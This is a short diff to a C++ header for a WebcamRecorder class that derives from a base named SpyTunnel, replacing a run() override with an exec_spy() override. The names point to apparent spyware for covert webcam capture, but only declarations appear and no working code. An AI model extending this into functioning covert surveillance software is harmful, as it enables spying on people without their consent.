@@ -7,9 +7,9 @@
 class WebcamRecorder : public SpyTunnel {
 public:
     WebcamRecorder() = default;
-    void run() override;
 protected:
     void spawn_window() override;
+    void exec_spy() override;
 };
 
 #endif // WEBCAM_RECORDER_HPP`
